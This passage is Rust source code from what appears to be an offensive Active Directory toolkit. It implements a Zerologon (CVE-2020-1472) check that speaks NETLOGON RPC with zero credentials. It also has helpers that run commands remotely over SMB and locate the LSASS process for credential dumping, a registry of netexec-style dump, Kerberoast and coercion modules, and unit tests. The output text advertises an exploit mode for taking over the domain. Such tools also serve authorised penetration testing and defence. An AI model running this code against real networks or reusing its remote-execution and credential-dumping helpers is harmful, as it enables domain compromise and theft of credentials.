        resp[error_offset + 2],
        resp[error_offset + 3],
    ]);
    Ok(error_code)
}

pub struct ZerologonModule;

#[async_trait]
impl OvtModule for ZerologonModule {
    fn name(&self) -> &'static str {
        "zerologon"
    }
    fn description(&self) -> &'static str {
        "Zerologon (CVE-2020-1472) — check if DC is vulnerable to Netlogon elevation of privilege"
    }
    fn category(&self) -> ModuleCategory {
        ModuleCategory::Scan
    }
    fn requires_creds(&self) -> bool {
        false
    }

    async fn run(
        &self,
        target: &str,
        creds: ExecCredentials,
        _params: Option<Value>,
    ) -> Result<ExecOutput> {
        let computer = format!("DESKTOP-{:04X}", rand::random::<u16>());
        let server = format!("\\\\{}", target);

        let session = match smb_connect(target, &creds).await {
            Ok(s) => s,
            Err(_) => {
                // fallback: guest/null session
                overthrone_core::proto::smb::SmbSession::connect(target, "", "guest", "")
                    .await
                    .map_err(|e| {
                        OverthroneError::custom(format!("SMB connect (zerologon) failed: {e}"))
                    })?
            }
        };

        // Step 1: RPC bind to NETLOGON pipe
        let bind_pdu = build_netlogon_rpc_bind();
        let bind_resp = session
            .pipe_transact("netlogon", &bind_pdu)
            .await
            .map_err(|e| OverthroneError::custom(format!("NETLOGON pipe bind failed: {e}")))?;
        validate_rpc_bind_ack_netlogon(&bind_resp)?;

        // Step 2: NetrServerReqChallenge with zero client challenge
        let challenge_req = build_netr_server_req_challenge(&server, &computer);
        let _challenge_resp = session
            .pipe_transact("netlogon", &challenge_req)
            .await
            .map_err(|e| OverthroneError::custom(format!("NetrServerReqChallenge failed: {e}")))?;

        // Step 3: NetrServerAuthenticate3 with zero credentials
        let auth3_req = build_netr_server_authenticate3(&server, &computer, &computer);
        let auth3_resp = session
            .pipe_transact("netlogon", &auth3_req)
            .await
            .map_err(|e| OverthroneError::custom(format!("NetrServerAuthenticate3 failed: {e}")))?;

        let error_code = parse_auth3_response(&auth3_resp)?;

        let (vulnerable, detail) = if error_code == 0 {
            (
                true,
                format!(
                    "VULNERABLE: NetrServerAuthenticate3 returned STATUS_SUCCESS (0x{:08x}) \
                 with zero credentials. Domain controller is vulnerable to CVE-2020-1472.\n\
                 Impact: Attackers can escalate from unauthenticated to domain admin by \
                 setting the computer account password to empty.\n\
                 Remediation: Install KB4565503 / KB4565349 / KB4565511 and enable \
                 'Domain controller: Allow vulnerable Netlogon secure channel connections' = 0.\n\
                 Exploitation: Use 'ovt module run zerologon -t {} -d {} -u {} -p <pass>' \
                 with --params '{{\"exploit\":true}}\"...",
                    error_code, target, creds.domain, creds.username
                ),
            )
        } else {
            (
                false,
                format!(
                    "NOT VULNERABLE: NetrServerAuthenticate3 returned error code 0x{:08x}. \
                 Target has CVE-2020-1472 patch applied or Netlogon behaves securely.",
                    error_code
                ),
            )
        };

        Ok(ExecOutput {
            stdout: format!(
                "Zerologon Check (CVE-2020-1472) for {}:\n\n  {}\n\n{}",
                target,
                if vulnerable {
                    "⚠️  VULNERABLE".to_string()
                } else {
                    "✅  Not Vulnerable".to_string()
                },
                detail
            ),
            stderr: String::new(),
            exit_code: Some(if vulnerable { 1 } else { 0 }),
            method: overthrone_core::exec::ExecMethod::WinRM,
        })
    }
}

// ═══════════════════════════════════════════════════════════
// HELPERS
// ═══════════════════════════════════════════════════════════

/// Connect to SMB with hash or password auth
async fn smb_connect(
    target: &str,
    creds: &ExecCredentials,
) -> Result<overthrone_core::proto::smb::SmbSession> {
    if let Some(nt) = creds.nt_hash.as_deref() {
        overthrone_core::proto::smb::SmbSession::connect_with_hash(
            target,
            &creds.domain,
            &creds.username,
            nt,
        )
        .await
    } else {
        overthrone_core::proto::smb::SmbSession::connect(
            target,
            &creds.domain,
            &creds.username,
            &creds.password,
        )
        .await
    }
}

/// Execute a command on a remote target via SMB exec
async fn exec_smb_command(target: &str, creds: &ExecCredentials, command: &str) -> Result<()> {
    let session = smb_connect(target, creds).await?;
    let res = overthrone_core::exec::smbexec::exec_command(&session, command).await?;
    if !res.success {
        return Err(OverthroneError::custom(format!(
            "SMB exec failed (output: {:?})",
            res.output
        )));
    }
    Ok(())
}

/// Get LSASS PID remotely via tasklist on target
async fn get_lsass_pid_remote(target: &str, creds: &ExecCredentials) -> Result<u32> {
    let outfile = format!("__lsass_pid_{:08X}.txt", rand::random::<u32>());
    let cmd = format!(
        "cmd.exe /c \"tasklist /FI \"IMAGENAME eq lsass.exe\" /FO CSV /NH > C:\\Windows\\Temp\\{}\"",
        outfile
    );

    exec_smb_command(target, creds, &cmd).await?;
    tokio::time::sleep(std::time::Duration::from_millis(500)).await;

    let session = smb_connect(target, creds).await?;
    let data = session
        .read_file("C$", &format!("Windows\\Temp\\{}", outfile))
        .await?;

    let _ = session
        .delete_file("C$", &format!("Windows\\Temp\\{}", outfile))
        .await;

    for line in String::from_utf8_lossy(&data).lines() {
        let parts: Vec<&str> = line.split(',').collect();
        if parts.len() >= 2
            && let Ok(pid) = parts[1].trim_matches('"').trim().parse::<u32>()
        {
            return Ok(pid);
        }
    }

    // Fallback to well-known PID
    Ok(572)
}

// ═══════════════════════════════════════════════════════════
// Registration
// ═══════════════════════════════════════════════════════════

/// Register all CME/netexec-style extended modules.
pub async fn register_extended_modules() {
    let modules: Vec<Arc<dyn OvtModule>> = vec![
        Arc::new(ProcdumpModule),
        Arc::new(LsassyModule),
        Arc::new(SamDumpModule),
        Arc::new(LsaDumpModule),
        Arc::new(NtdsDumpModule),
        Arc::new(BloodHoundModule),
        Arc::new(KerberoastModule),
        Arc::new(AsreproastModule),
        Arc::new(LapsModule),
        Arc::new(GppModule),
        Arc::new(CoerceModule),
        Arc::new(NslookupModule),
        Arc::new(ZerologonModule),
    ];

    for m in modules {
        register_module(m).await;
    }

    info!(
        "Registered 13 extended modules (total: {})",
        overthrone_core::exec::modules::module_count().await
    );
}

// ═══════════════════════════════════════════════════════════
// TESTS
// ═══════════════════════════════════════════════════════════

#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn test_extended_module_registration() {
        overthrone_core::exec::modules::register_core_modules().await;
        register_extended_modules().await;

        let modules = overthrone_core::exec::modules::list_modules().await;
        assert!(modules.contains(&"procdump".to_string()));
        assert!(modules.contains(&"lsassy".to_string()));
        assert!(modules.contains(&"sam-dump".to_string()));
        assert!(modules.contains(&"lsa-dump".to_string()));
        assert!(modules.contains(&"ntds-dump".to_string()));
        assert!(modules.contains(&"bloodhound".to_string()));
        assert!(modules.contains(&"kerberoast".to_string()));
        assert!(modules.contains(&"asreproast".to_string()));
        assert!(modules.contains(&"laps".to_string()));
        assert!(modules.contains(&"gpp".to_string()));
        assert!(modules.contains(&"coerce".to_string()));
        assert!(modules.contains(&"nslookup".to_string()));
        assert!(modules.contains(&"zerologon".to_string()));
    }

    #[tokio::test]
    async fn test_module_metadata() {
        overthrone_core::exec::modules::register_core_modules().await;
        register_extended_modules().await;

        let meta = overthrone_core::exec::modules::list_module_metadata().await;

        let ntds = meta.iter().find(|m| m.name == "ntds-dump").unwrap();
        assert_eq!(
            ntds.category,
            overthrone_core::exec::modules::ModuleCategory::Dump
        );
        assert!(ntds.requires_creds);
        assert!(ntds.requires_target);

        let zerologon = meta.iter().find(|m| m.name == "zerologon").unwrap();
        assert_eq!(
            zerologon.category,
            overthrone_core::exec::modules::ModuleCategory::Scan
        );
        assert!(!zerologon.requires_creds);

        let laps = meta.iter().find(|m| m.name == "laps").unwrap();
        assert!(laps.requires_creds);
    }

    #[test]
    fn test_zerologon_rpc_bind_pdu() {
        let pdu = build_netlogon_rpc_bind();
        assert!(!pdu.is_empty());
        assert_eq!(pdu[0], 5);
        assert_eq!(pdu[1], 0);
        assert_eq!(pdu[2], 11); // BIND
        assert_eq!(pdu[3], 0x03);
        // NETLOGON UUID at offset 32 (after header + body_1 + context_list)
        assert_eq!(&pdu[32..48], &NETLOGON_UUID);
    }

    #[test]
    fn test_zerologon_rpc_pdu_helpers() {
        let challenge = build_netr_server_req_challenge("\\\\dc01.lab.local", "DESKTOP-ABC1");
        assert_eq!(challenge[2], 0); // REQUEST
        assert_eq!(challenge[3], 0x03);
        // opnum 4 at offset 22 (after header + alloc_hint + context_id)
        assert_eq!(&challenge[22..24], &4u16.to_le_bytes()[..]);

        let auth3 = build_netr_server_authenticate3("\\\\dc01.lab.local", "DC01$", "DESKTOP-ABC1");
        assert_eq!(auth3[2], 0);
        assert_eq!(auth3[3], 0x03);
        assert_eq!(&auth3[22..24], &26u16.to_le_bytes()[..]);
    }

    #[test]
    fn test_validate_rpc_bind_ack_rejects_invalid() {
        let result = validate_rpc_bind_ack_netlogon(&[5, 0, 1, 0x03, 0, 0, 0, 0]);
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("rejected"));
    }

    #[test]
    fn test_validate_rpc_bind_ack_accepts_valid() {
        let mut ack = vec![5, 0, 12, 0x03];
        ack.resize(24, 0);
        let result = validate_rpc_bind_ack_netlogon(&ack);
        assert!(result.is_ok());
    }

    #[test]
    fn test_parse_auth3_response_returns_error() {
        let result = parse_auth3_response(&[0u8; 30]);
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("too short"));
    }

    #[test]
    fn test_parse_auth3_response_reads_error_code() {
        let mut resp = vec![0u8; 68];
        // RPC header (24 bytes) + stub offset 28 for error code = total offset 52
        let error_offset = 24 + 28;
        resp[error_offset..error_offset + 4].copy_from_slice(&3221225477u32.to_le_bytes());
        let err = parse_auth3_response(&resp).unwrap();
        assert_eq!(err, 3221225477); // STATUS_ACCESS_DENIED
    }

    #[test]
    fn test_encode_ndr_unique_string() {
        let encoded = encode_ndr_unique_string("test");
        // pointer (non-null), max_count, offset, actual_count
        assert_eq!(&encoded[0..4], &1u32.to_le_bytes());
        let count = u32::from_le_bytes([encoded[4], encoded[5], encoded[6], encoded[7]]);
        assert_eq!(count, 5); // "test" + null = 5 characters
    }

    #[tokio::test]
    async fn test_nslookup_resolves_known_host() {
        // This tests that the nslookup function actually does a real DNS lookup
        let nslookup = NslookupModule;
        assert_eq!(nslookup.name(), "nslookup");
        assert_eq!(
            nslookup.category(),
            overthrone_core::exec::modules::ModuleCategory::Scan
        );
    }

    #[tokio::test]
    async fn test_procdump_module_dry_run() {
        let module = ProcdumpModule;
        assert_eq!(module.name(), "procdump");
        assert_eq!(
            module.category(),
            overthrone_core::exec::modules::ModuleCategory::Dump
        );
        // Verify it has correct metadata
        let meta = module.metadata();
        assert_eq!(meta.name, "procdump");
        assert!(meta.requires_creds);
    }

    #[tokio::test]
    async fn test_sam_dump_module_dry_run() {
        let module = SamDumpModule;
        assert_eq!(module.name(), "sam-dump");
        let meta = module.metadata();
        assert!(meta.requires_creds);
    }

    #[tokio::test]
    async fn test_coerce_module_nthash_auth() {
        let module = CoerceModule;
        let meta = module.metadata();
        assert_eq!(meta.name, "coerce");
        // Verify the module is registered in the right category
        assert_eq!(
            module.category(),
            overthrone_core::exec::modules::ModuleCategory::Coerce
        );
    }

    #[test]
    fn test_module_category_labels() {
        assert_eq!(
            overthrone_core::exec::modules::ModuleCategory::Execute.label(),
            "Execute"
        );
        assert_eq!(
            overthrone_core::exec::modules::ModuleCategory::Dump.label(),
            "Dump"
        );
        assert_eq!(
            overthrone_core::exec::modules::ModuleCategory::Enum.label(),
            "Enum"
        );
        assert_eq!(
            overthrone_core::exec::modules::ModuleCategory::Kerberos.label(),
            "Kerberos"
        );
        assert_eq!(
            overthrone_core::exec::modules::ModuleCategory::Secrets.label(),
            "Secrets"
        );
        assert_eq!(
            overthrone_core::exec::modules::ModuleCategory::Scan.label(),
            "Scan"
        );
        assert_eq!(
            overthrone_core::exec::modules::ModuleCategory::Coerce.label(),
            "Coerce"
        );
    }

    #[test]
    fn test_parallel_module_config_default() {
        let cfg = overthrone_core::exec::modules::ParallelModuleConfig::default();
        assert_eq!(cfg.concurrency, 10);
        assert_eq!(cfg.timeout_secs, 30);
    }

    #[tokio::test]
    async fn test_module_registry_category_filter() {
        overthrone_core::exec::modules::register_core_modules().await;
        register_extended_modules().await;

        let scan_modules = overthrone_core::exec::modules::list_modules_by_category(
            overthrone_core::exec::modules::ModuleCategory::Scan,
        )
        .await;
        assert!(scan_modules.contains(&"zerologon".to_string()));

        let dump_modules = overthrone_core::exec::modules::list_modules_by_category(
            overthrone_core::exec::modules::ModuleCategory::Dump,
        )
        .await;
        assert!(dump_modules.contains(&"ntds-dump".to_string()));
        assert!(dump_modules.contains(&"sam-dump".to_string()));
        assert!(dump_modules.contains(&"lsa-dump".to_string()));
        assert!(dump_modules.contains(&"procdump".to_string()));
    }
}
